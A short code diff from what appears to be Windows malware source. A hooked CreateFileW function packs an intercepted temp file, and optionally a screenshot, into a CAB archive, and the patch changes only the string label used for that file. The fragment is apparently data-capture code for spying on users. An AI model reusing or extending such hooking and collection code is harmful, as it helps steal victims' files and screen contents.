@@ -118,7 +118,7 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 							if ( hCab )
 							{
-								AddFileToCab( hCab, TempFile, GetStr(StrLogFileInformation).t_str());
+								AddFileToCab( hCab, TempFile, GetStr(StrLogFileTextData).t_str());
 
 								if ( bAddScreen )
 								{
